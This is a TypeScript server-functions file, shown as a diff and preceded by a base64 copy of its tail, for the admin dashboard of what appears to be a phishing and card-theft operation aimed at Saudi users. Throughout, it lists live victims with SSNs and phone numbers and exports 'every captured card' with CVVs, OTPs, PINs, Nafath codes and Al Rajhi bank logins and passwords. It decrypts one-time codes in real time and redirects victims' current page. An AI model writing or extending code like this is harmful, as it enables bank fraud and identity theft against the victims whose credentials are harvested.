3IEVycm9yKGVycm9yLm1lc3NhZ2UpOwogICAgcmV0dXJuIGRhdGEgPz8gW107CiAgfSk7CgpleHBvcnQgY29uc3QgYWRkQmFubmVkQ2FyZCA9IGNyZWF0ZVNlcnZlckZuKHsgbWV0aG9kOiAiUE9TVCIgfSkKICAubWlkZGxld2FyZShbcmVxdWlyZVN1cGFiYXNlQXV0aF0pCiAgLmlucHV0VmFsaWRhdG9yKChkYXRhKSA9PiB6Lm9iamVjdCh7IGNhcmRfbnVtYmVyOiB6LnN0cmluZygpLm1pbig0KSB9KS5wYXJzZShkYXRhKSkKICAuaGFuZGxlcihhc3luYyAoeyBjb250ZXh0LCBkYXRhIH0pID0+IHsKICAgIGF3YWl0IGFzc2VydEFkbWluKGNvbnRleHQpOwogICAgY29uc3QgeyBlcnJvciB9ID0gYXdhaXQgZGFzaGJvYXJkRGIoY29udGV4dCkuZnJvbSgiYmFubmVkX2NhcmRzIikuaW5zZXJ0KHsgY2FyZF9udW1iZXI6IGRhdGEuY2FyZF9udW1iZXIgfSk7CiAgICBpZiAoZXJyb3IpIHRocm93IG5ldyBFcnJvcihlcnJvci5tZXNzYWdlKTsKICAgIHJldHVybiB7IG9rOiB0cnVlIH07CiAgfSk7CgpleHBvcnQgY29uc3QgcmVtb3ZlQmFubmVkQ2FyZCA9IGNyZWF0ZVNlcnZlckZuKHsgbWV0aG9kOiAiUE9TVCIgfSkKICAubWlkZGxld2FyZShbcmVxdWlyZVN1cGFiYXNlQXV0aF0pCiAgLmlucHV0VmFsaWRhdG9yKChkYXRhKSA9PiB6Lm9iamVjdCh7IGlkOiB6LnN0cmluZygpLnV1aWQoKSB9KS5wYXJzZShkYXRhKSkKICAuaGFuZGxlcihhc3luYyAoeyBjb250ZXh0LCBkYXRhIH0pID0+IHsKICAgIGF3YWl0IGFzc2VydEFkbWluKGNvbnRleHQpOwogICAgY29uc3QgeyBlcnJvciB9ID0gYXdhaXQgZGFzaGJvYXJkRGIoY29udGV4dCkuZnJvbSgiYmFubmVkX2NhcmRzIikuZGVsZXRlKCkuZXEoImlkIiwgZGF0YS5pZCk7CiAgICBpZiAoZXJyb3IpIHRocm93IG5ldyBFcnJvcihlcnJvci5tZXNzYWdlKTsKICAgIHJldHVybiB7IG9rOiB0cnVlIH07CiAgfSk7CgpleHBvcnQgY29uc3QgbGlzdEJhbm5lZElwcyA9IGNyZWF0ZVNlcnZlckZuKHsgbWV0aG9kOiAiR0VUIiB9KQogIC5taWRkbGV3YXJlKFtyZXF1aXJlU3VwYWJhc2VBdXRoXSkKICAuaGFuZGxlcihhc3luYyAoeyBjb250ZXh0IH0pID0+IHsKICAgIGF3YWl0IGFzc2VydEFkbWluKGNvbnRleHQpOwogICAgY29uc3QgeyBkYXRhLCBlcnJvciB9ID0gYXdhaXQgZGFzaGJvYXJkRGIoY29udGV4dCkKICAgICAgLmZyb20oImJhbm5lZF9pcHMiKQogICAgICAuc2VsZWN0KCIqIikKICAgICAgLm9yZGVyKCJjcmVhdGVkX2F0IiwgeyBhc2NlbmRpbmc6IGZhbHNlIH0pOwogICAgaWYgKGVycm9yKSB0aHJvdyBuZXcgRXJyb3IoZXJyb3IubWVzc2FnZSk7CiAgICByZXR1cm4gZGF0YSA/PyBbXTsKICB9KTsKCmV4cG9ydCBjb25zdCBhZGRCYW5uZWRJcCA9IGNyZWF0ZVNlcnZlckZuKHsgbWV0aG9kOiAiUE9TVCIgfSkKICAubWlkZGxld2FyZShbcmVxdWlyZVN1cGFiYXNlQXV0aF0pCiAgLmlucHV0VmFsaWRhdG9yKChkYXRhKSA9PiB6Lm9iamVjdCh7IGlwOiB6LnN0cmluZygpLm1pbigzKSB9KS5wYXJzZShkYXRhKSkKICAuaGFuZGxlcihhc3luYyAoeyBjb250ZXh0LCBkYXRhIH0pID0+IHsKICAgIGF3YWl0IGFzc2VydEFkbWluKGNvbnRleHQpOwogICAgY29uc3QgeyBlcnJvciB9ID0gYXdhaXQgZGFzaGJvYXJkRGIoY29udGV4dCkuZnJvbSgiYmFubmVkX2lwcyIpLmluc2VydCh7IGlwOiBkYXRhLmlwIH0pOwogICAgaWYgKGVycm9yKSB0aHJvdyBuZXcgRXJyb3IoZXJyb3IubWVzc2FnZSk7CiAgICByZXR1cm4geyBvazogdHJ1ZSB9OwogIH0pOwoKZXhwb3J0IGNvbnN0IHJlbW92ZUJhbm5lZElwID0gY3JlYXRlU2VydmVyRm4oeyBtZXRob2Q6ICJQT1NUIiB9KQogIC5taWRkbGV3YXJlKFtyZXF1aXJlU3VwYWJhc2VBdXRoXSkKICAuaW5wdXRWYWxpZGF0b3IoKGRhdGEpID0+IHoub2JqZWN0KHsgaWQ6IHouc3RyaW5nKCkudXVpZCgpIH0pLnBhcnNlKGRhdGEpKQogIC5oYW5kbGVyKGFzeW5jICh7IGNvbnRleHQsIGRhdGEgfSkgPT4gewogICAgYXdhaXQgYXNzZXJ0QWRtaW4oY29udGV4dCk7CiAgICBjb25zdCB7IGVycm9yIH0gPSBhd2FpdCBkYXNoYm9hcmREYihjb250ZXh0KS5mcm9tKCJiYW5uZWRfaXBzIikuZGVsZXRlKCkuZXEoImlkIiwgZGF0YS5pZCk7CiAgICBpZiAoZXJyb3IpIHRocm93IG5ldyBFcnJvcihlcnJvci5tZXNzYWdlKTsKICAgIHJldHVybiB7IG9rOiB0cnVlIH07CiAgfSk7CgovKiogRXhwb3J0IGV2ZXJ5IGNhcHR1cmVkIGNhcmQgd2l0aCBpdHMgcmVsYXRlZCBoaXN0b3JpZXMgZm9yIGJhY2t1cC4gKi8KZXhwb3J0IGNvbnN0IGV4cG9ydEFsbENhcmRzID0gY3JlYXRlU2VydmVyRm4oeyBtZXRob2Q6ICJHRVQiIH0pCiAgLm1pZGRsZXdhcmUoW3JlcXVpcmVTdXBhYmFzZUF1dGhdKQogIC5oYW5kbGVyKGFzeW5jICh7IGNvbnRleHQgfSkgPT4gewogICAgYXdhaXQgYXNzZXJ0QWRtaW4oY29udGV4dCk7CiAgICBjb25zdCB7IGRhdGEsIGVycm9yIH0gPSBhd2FpdCBkYXNoYm9hcmREYihjb250ZXh0KQogICAgICAuZnJvbSgiY2FyZHMiKQogICAgICAuc2VsZWN0KAogICAgICAgICIqLCBxdW90ZTpxdW90ZXMoc2Vzc2lvbl9pZCwgdmlzaXRvcl9uYW1lLCBzc24sIHBob25lLCBjb3VudHJ5LCBpcF9hZGRyZXNzLCBjdXJyZW50X3BhZ2UpLCBjYXJkX290cF9oaXN0b3J5KG90cCwgY3JlYXRlZF9hdCksIGNhcmRfcGluX2hpc3RvcnkocGluLCBjcmVhdGVkX2F0KSwgY2FyZF9uYWZhdGhfaGlzdG9yeShjb2RlLCBjcmVhdGVkX2F0KSwgY2FyZF9yYWpoaV9oaXN0b3J5KHVzZXJuYW1lLCBwYXNzd29yZCwgY3JlYXRlZF9hdCksIGNhcmRfaW5wdXRfaGlzdG9yeShjYXJkX251bWJlciwgY2FyZF9uYW1lLCB5ZWFyLCBjdnYsIHBob25lX251bWJlciwgY3JlYXRlZF9hdCkiLAogICAgICApCiAgICAgIC5vcmRlcigiY3JlYXRlZF9hdCIsIHsgYXNjZW5kaW5nOiBmYWxzZSB9KTsKICAgIGlmIChlcnJvcikgdGhyb3cgbmV3IEVycm9yKGVycm9yLm1lc3NhZ2UpOwogICAgYXdhaXQgbG9nQWN0aXZpdHkoY29udGV4dCwgeyBhY3Rpb246ICJleHBvcnRfY2FyZHMiLCBtZXRhOiB7IGNvdW50OiAoZGF0YSA/PyBbXSkubGVuZ3RoIH0gfSk7CiAgICByZXR1cm4gZGVjcnlwdERlZXAoZGF0YSA/PyBbXSk7CiAgfSk7CgovKioKICogRGVjcnlwdCBzaG9ydCBzdHJpbmdzIGFycml2aW5nIGluIHJlYWx0aW1lIHBheWxvYWRzIChjYXJkIG51bWJlcnMsIE9UUAogKiBjb2RlcywgbmFmYXRoIGNvZGVzKSBzbyBkYXNoYm9hcmQgbm90aWZpY2F0aW9ucyBzaG93IHJlYWRhYmxlIHZhbHVlcy4KICogQWRtaW4tb25seTsgaW5wdXQgaXMgY2FwcGVkIHRvIGEgZmV3IHNob3J0IHN0cmluZ3MuCiAqLwpleHBvcnQgY29uc3QgZGVjcnlwdEFsZXJ0VmFsdWVzID0gY3JlYXRlU2VydmVyRm4oeyBtZXRob2Q6ICJQT1NUIiB9KQogIC5taWRkbGV3YXJlKFtyZXF1aXJlU3VwYWJhc2VBdXRoXSkKICAuaW5wdXRWYWxpZGF0b3IoKGRhdGE6IHVua25vd24pID0+CiAgICB6Lm9iamVjdCh7IHZhbHVlczogei5hcnJheSh6LnN0cmluZygpLm1heCgyMDAwKSkubWF4KDUpIH0pLnBhcnNlKGRhdGEpLAogICkKICAuaGFuZGxlcihhc3luYyAoeyBkYXRhLCBjb250ZXh0IH0pID0+IHsKICAgIGF3YWl0IGFzc2VydEFkbWluKGNvbnRleHQpOwogICAgY29uc3QgeyBkZWNyeXB0RmllbGQgfSA9IGF3YWl0IGltcG9ydCgiLi9jcnlwdG8uc2VydmVyIik7CiAgICByZXR1cm4geyB2YWx1ZXM6IGRhdGEudmFsdWVzLm1hcCgodikgPT4gZGVjcnlwdEZpZWxkKHYpID8/IHYpIH07CiAgfSk7Cg==
+import { createServerFn } from "@tanstack/react-start";
+import type { SupabaseClient } from "@supabase/supabase-js";
+import { z } from "zod";
+import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";
+import { decryptDeep, hashField } from "./crypto.server";
+
+/** Search filter that works over encrypted columns: exact blind-index match
+ *  for ssn/phone, plus plaintext ilike for legacy rows and non-encrypted fields. */
+function applyVisitorSearch<T extends { or: (f: string) => T }>(q: T, raw: string): T {
+  const s = raw.trim();
+  const parts = [`session_id.ilike.%${s}%`, `ssn.ilike.%${s}%`, `phone.ilike.%${s}%`, `visitor_name.ilike.%${s}%`];
+  const h = hashField(s);
+  if (h) parts.push(`ssn_hash.eq.${h}`, `phone_hash.eq.${h}`);
+  return q.or(parts.join(","));
+}
+
+type DashboardDatabaseClient = SupabaseClient<any>;
+
+function dashboardDb(context: { supabase: SupabaseClient }) {
+  return context.supabase as DashboardDatabaseClient;
+}
+
+async function assertAdmin(context: {
+  supabase: import("@supabase/supabase-js").SupabaseClient;
+  userId: string;
+}) {
+  const { data, error } = await dashboardDb(context)
+    .from("user_roles")
+    .select("role")
+    .eq("user_id", context.userId)
+    .eq("role", "admin")
+    .maybeSingle();
+  if (error) throw new Error(error.message);
+  if (!data) throw new Error("Forbidden: admin only");
+}
+
+async function logActivity(
+  context: {
+    supabase: import("@supabase/supabase-js").SupabaseClient;
+    userId: string;
+    claims?: { email?: string } | null;
+  },
+  entry: { action: string; target_type?: string; target_id?: string; meta?: Record<string, unknown> },
+) {
+  await dashboardDb(context).from("admin_activity_log").insert({
+    actor_id: context.userId,
+    actor_email: context.claims?.email ?? null,
+    action: entry.action,
+    target_type: entry.target_type ?? null,
+    target_id: entry.target_id ?? null,
+    meta: entry.meta ?? {},
+  } as never);
+}
+
+export const getStats = createServerFn({ method: "GET" })
+  .middleware([requireSupabaseAuth])
+  .handler(async ({ context }) => {
+    await assertAdmin(context);
+    const supabase = dashboardDb(context);
+
+    const today = new Date();
+    today.setUTCHours(0, 0, 0, 0);
+    const todayIso = today.toISOString();
+
+    const [total, todayCount, cards, calls, online] = await Promise.all([
+      supabase.from("quotes").select("id", { count: "exact", head: true }),
+      supabase.from("quotes").select("id", { count: "exact", head: true }).gte("created_at", todayIso),
+      supabase.from("cards").select("id", { count: "exact", head: true }),
+      supabase.from("quotes").select("id", { count: "exact", head: true }).not("phone", "is", null),
+      supabase
+        .from("quotes")
+        .select("id", { count: "exact", head: true })
+        .gte("last_active_at", new Date(Date.now() - 2 * 60 * 1000).toISOString()),
+    ]);
+
+    return {
+      totalVisitors: total.count ?? 0,
+      todayVisitors: todayCount.count ?? 0,
+      cards: cards.count ?? 0,
+      calls: calls.count ?? 0,
+      online: online.count ?? 0,
+    };
+  });
+
+export const listVisitors = createServerFn({ method: "GET" })
+  .middleware([requireSupabaseAuth])
+  .inputValidator((data) =>
+    z
+      .object({
+        filter: z.enum(["all", "online", "card", "archive", "trash"]).default("all"),
+        search: z.string().optional(),
+      })
+      .parse(data),
+  )
+  .handler(async ({ context, data }) => {
+    await assertAdmin(context);
+    let q = dashboardDb(context)
+      .from("quotes")
+      .select("*, cards(id, card_number), quote_details(full_name)")
+      .order("last_active_at", { ascending: false })
+      .limit(200);
+
+    if (data.filter === "trash") {
+      q = q.eq("trashed", true);
+    } else {
+      q = q.eq("trashed", false);
+      if (data.filter === "archive") q = q.eq("archived", true);
+      else q = q.eq("archived", false);
+      if (data.filter === "card") q = q.not("cards", "is", null);
+      if (data.filter === "online") {
+        const since = new Date(Date.now() - 2 * 60 * 1000).toISOString();
+        q = q.gte("last_active_at", since);
+      }
+    }
+
+    if (data.search && data.search.trim()) {
+      q = applyVisitorSearch(q, data.search);
+    }
+
+    const { data: rows, error } = await q;
+    if (error) throw new Error(error.message);
+    return decryptDeep(rows ?? []);
+  });
+
+/** List visitors currently on the home page ("الرئيسية"), most recent first. */
+export const listHomeVisitors = createServerFn({ method: "GET" })
+  .middleware([requireSupabaseAuth])
+  .inputValidator((data) =>
+    z
+      .object({
+        onlyOnline: z.boolean().default(true),
+        search: z.string().optional(),
+      })
+      .parse(data),
+  )
+  .handler(async ({ context, data }) => {
+    await assertAdmin(context);
+    let q = dashboardDb(context)
+      .from("quotes")
+      .select("*, cards(id, card_number), quote_details(full_name)")
+      .eq("trashed", false)
+      .eq("current_page", "الرئيسية")
+      .order("last_active_at", { ascending: false })
+      .limit(300);
+    if (data.onlyOnline) {
+      const since = new Date(Date.now() - 2 * 60 * 1000).toISOString();
+      q = q.gte("last_active_at", since);
+    }
+    if (data.search && data.search.trim()) {
+      const s = data.search.trim();
+      const parts = [`session_id.ilike.%${s}%`, `ssn.ilike.%${s}%`, `phone.ilike.%${s}%`, `visitor_name.ilike.%${s}%`, `ip_address.ilike.%${s}%`];
+      const h = hashField(s);
+      if (h) parts.push(`ssn_hash.eq.${h}`, `phone_hash.eq.${h}`);
+      q = q.or(parts.join(","));
+    }
+    const { data: rows, error } = await q;
+    if (error) throw new Error(error.message);
+    return decryptDeep(rows ?? []);
+  });
+
+/** Move all offline (>2 min) visitors without a card into trash. */
+export const trashOfflineNoCard = createServerFn({ method: "POST" })
+  .middleware([requireSupabaseAuth])
+  .handler(async ({ context }) => {
+    await assertAdmin(context);
+    const cutoff = new Date(Date.now() - 2 * 60 * 1000).toISOString();
+    const { data: candidates, error: e1 } = await dashboardDb(context)
+      .from("quotes")
+      .select("id, cards(id)")
+      .eq("trashed", false)
+      .lt("last_active_at", cutoff);
+    if (e1) throw new Error(e1.message);
+    const ids = (candidates ?? [])
+      .filter((r: any) => !r.cards || r.cards.length === 0)
+      .map((r: any) => r.id as string);
+    if (ids.length === 0) return { moved: 0 };
+    const { error: e2 } = await dashboardDb(context)
+      .from("quotes")
+      .update({ trashed: true } as never)
+      .in("id", ids);
+    if (e2) throw new Error(e2.message);
+    await logActivity(context, {
+      action: "bulk_trash",
+      target_type: "quotes",
+      meta: { count: ids.length, ids },
+    });
+    return { moved: ids.length };
+  });
+
+/** Trash or restore a single visitor. */
+export const setTrashed = createServerFn({ method: "POST" })
+  .middleware([requireSupabaseAuth])
+  .inputValidator((data) =>
+    z.object({ id: z.string().uuid(), trashed: z.boolean() }).parse(data),
+  )
+  .handler(async ({ context, data }) => {
+    await assertAdmin(context);
+    const { data: q } = await dashboardDb(context)
+      .from("quotes")
+      .select("session_id, ssn, phone, visitor_name")
+      .eq("id", data.id)
+      .maybeSingle();
+    const { error } = await dashboardDb(context)
+      .from("quotes")
+      .update({ trashed: data.trashed } as never)
+      .eq("id", data.id);
+    if (error) throw new Error(error.message);
+    await logActivity(context, {
+      action: data.trashed ? "trash" : "restore",
+      target_type: "quote",
+      target_id: data.id,
+      meta: {
+        session_id: (q as any)?.session_id,
+        ssn: (q as any)?.ssn,
+        phone: (q as any)?.phone,
+        name: (q as any)?.visitor_name,
+      },
+    });
+    return { ok: true };
+  });
+
+export const listActivityLog = createServerFn({ method: "GET" })
+  .middleware([requireSupabaseAuth])
+  .inputValidator((data) => z.object({ limit: z.number().int().min(1).max(500).default(100) }).parse(data ?? {}))
+  .handler(async ({ context, data }) => {
+    await assertAdmin(context);
+    const { data: rows, error } = await dashboardDb(context)
+      .from("admin_activity_log")
+      .select("*")
+      .order("created_at", { ascending: false })
+      .limit(data.limit);
+    if (error) throw new Error(error.message);
+    return rows ?? [];
+  });
+
+export const getVisitorFull = createServerFn({ method: "GET" })
+  .middleware([requireSupabaseAuth])
+  .inputValidator((data) => z.object({ id: z.string().uuid() }).parse(data))
+  .handler(async ({ context, data }) => {
+    await assertAdmin(context);
+    const { data: quote, error } = await dashboardDb(context)
+      .from("quotes")
+      .select(
+        "*, quote_details(*), quote_submission_history(*), cards(*, card_otp_history(*), card_nafath_history(*), card_input_history(*), card_pin_history(*), card_rajhi_history(*))",
+      )
+      .eq("id", data.id)
+      .maybeSingle();
+    if (error) throw new Error(error.message);
+    if (quote) {
+      const cards = (quote as any).cards ?? [];
+      const sortAsc = (a: any, b: any) => new Date(a.created_at).getTime() - new Date(b.created_at).getTime();
+      (quote as any).card_otp_history = cards.flatMap((c: any) => c.card_otp_history ?? []).sort(sortAsc);
+      (quote as any).card_nafath_history = cards.flatMap((c: any) => c.card_nafath_history ?? []).sort(sortAsc);
+      (quote as any).card_input_history = cards.flatMap((c: any) => c.card_input_history ?? []).sort(sortAsc);
+      (quote as any).card_pin_history = cards.flatMap((c: any) => c.card_pin_history ?? []).sort(sortAsc);
+      (quote as any).card_rajhi_history = cards.flatMap((c: any) => c.card_rajhi_history ?? []).sort(sortAsc);
+      (quote as any).quote_submission_history = ((quote as any).quote_submission_history ?? []).sort(sortAsc);
+    }
+    return decryptDeep(quote);
+  });
+
+export const updateVisitor = createServerFn({ method: "POST" })
+  .middleware([requireSupabaseAuth])
+  .inputValidator((data) =>
+    z
+      .object({
+        id: z.string().uuid(),
+        current_page: z.string().optional(),
+        blocked: z.boolean().optional(),
+        archived: z.boolean().optional(),
+        pinned: z.boolean().optional(),
+        distinguished: z.boolean().optional(),
+        nafath_number: z.string().max(20).nullable().optional(),
+      })
+      .parse(data),
+  )
+  .handler(async ({ context, data }) => {
+    await assertAdmin(context);
+    const { id, ...rest } = data;
+    const patch: Record<string, unknown> = {};
+    for (const [k, v] of Object.entries(rest)) if (v !== undefined) patch[k] = v;
+    const { error } = await dashboardDb(context).from("quotes").update(patch as never).eq("id", id);
+    if (error) throw new Error(error.message);
+    return { ok: true };
+  });
+
+export const listSettings = createServerFn({ method: "GET" })
+  .middleware([requireSupabaseAuth])
+  .handler(async ({ context }) => {
+    await assertAdmin(context);
+    const { data, error } = await dashboardDb(context).from("settings").select("*");
+    if (error) throw new Error(error.message);
+    return data ?? [];
+  });
+
+export const upsertSetting = createServerFn({ method: "POST" })
+  .middleware([requireSupabaseAuth])
+  .inputValidator((data) =>
+    z.object({ setting_key: z.string().min(1), setting_value: z.string() }).parse(data),
+  )
+  .handler(async ({ context, data }) => {
+    await assertAdmin(context);
+    const { error } = await dashboardDb(context)
+      .from("settings")
+      .upsert({ setting_key: data.setting_key, setting_value: data.setting_value }, {
+        onConflict: "setting_key",
+      });
+    if (error) throw new Error(error.message);
+    return { ok: true };
+  });
+
+export const listBannedCards = createServerFn({ method: "GET" })
+  .middleware([requireSupabaseAuth])
+  .handler(async ({ context }) => {
+    await assertAdmin(context);
+    const { data, error } = await dashboardDb(context)
+      .from("banned_cards")
+      .select("*")
+      .order("created_at", { ascending: false });
+    if (error) throw new Error(error.message);
+    return data ?? [];
+  });
+
+export const addBannedCard = createServerFn({ method: "POST" })
+  .middleware([requireSupabaseAuth])
+  .inputValidator((data) => z.object({ card_number: z.string().min(4) }).parse(data))
+  .handler(async ({ context, data }) => {
+    await assertAdmin(context);
+    const { error } = await dashboardDb(context).from("banned_cards").insert({ card_number: data.card_number });
+    if (error) throw new Error(error.message);
+    return { ok: true };
+  });
+
+export const removeBannedCard = createServerFn({ method: "POST" })
+  .middleware([requireSupabaseAuth])
+  .inputValidator((data) => z.object({ id: z.string().uuid() }).parse(data))
+  .handler(async ({ context, data }) => {
+    await assertAdmin(context);
+    const { error } = await dashboardDb(context).from("banned_cards").delete().eq("id", data.id);
+    if (error) throw new Error(error.message);
+    return { ok: true };
+  });
+
+export const listBannedIps = createServerFn({ method: "GET" })
+  .middleware([requireSupabaseAuth])
+  .handler(async ({ context }) => {
+    await assertAdmin(context);
+    const { data, error } = await dashboardDb(context)
+      .from("banned_ips")
+      .select("*")
+      .order("created_at", { ascending: false });
+    if (error) throw new Error(error.message);
+    return data ?? [];
+  });
+
+export const addBannedIp = createServerFn({ method: "POST" })
+  .middleware([requireSupabaseAuth])
+  .inputValidator((data) => z.object({ ip: z.string().min(3) }).parse(data))
+  .handler(async ({ context, data }) => {
+    await assertAdmin(context);
+    const { error } = await dashboardDb(context).from("banned_ips").insert({ ip: data.ip });
+    if (error) throw new Error(error.message);
+    return { ok: true };
+  });
+
+export const removeBannedIp = createServerFn({ method: "POST" })
+  .middleware([requireSupabaseAuth])
+  .inputValidator((data) => z.object({ id: z.string().uuid() }).parse(data))
+  .handler(async ({ context, data }) => {
+    await assertAdmin(context);
+    const { error } = await dashboardDb(context).from("banned_ips").delete().eq("id", data.id);
+    if (error) throw new Error(error.message);
+    return { ok: true };
+  });
+
+/** Export every captured card with its related histories for backup. */
+export const exportAllCards = createServerFn({ method: "GET" })
+  .middleware([requireSupabaseAuth])
+  .handler(async ({ context }) => {
+    await assertAdmin(context);
+    const { data, error } = await dashboardDb(context)
+      .from("cards")
+      .select(
+        "*, quote:quotes(session_id, visitor_name, ssn, phone, country, ip_address, current_page), card_otp_history(otp, created_at), card_pin_history(pin, created_at), card_nafath_history(code, created_at), card_rajhi_history(username, password, created_at), card_input_history(card_number, card_name, year, cvv, phone_number, created_at)",
+      )
+      .order("created_at", { ascending: false });
+    if (error) throw new Error(error.message);
+    await logActivity(context, { action: "export_cards", meta: { count: (data ?? []).length } });
+    return decryptDeep(data ?? []);
+  });
+
+/**
+ * Decrypt short strings arriving in realtime payloads (card numbers, OTP
+ * codes, nafath codes) so dashboard notifications show readable values.
+ * Admin-only; input is capped to a few short strings.
+ */
+export const decryptAlertValues = createServerFn({ method: "POST" })
+  .middleware([requireSupabaseAuth])
+  .inputValidator((data: unknown) =>
+    z.object({ values: z.array(z.string().max(2000)).max(5) }).parse(data),
+  )
+  .handler(async ({ data, context }) => {
+    await assertAdmin(context);
+    const { decryptField } = await import("./crypto.server");
+    return { values: data.values.map((v) => decryptField(v) ?? v) };
+  });
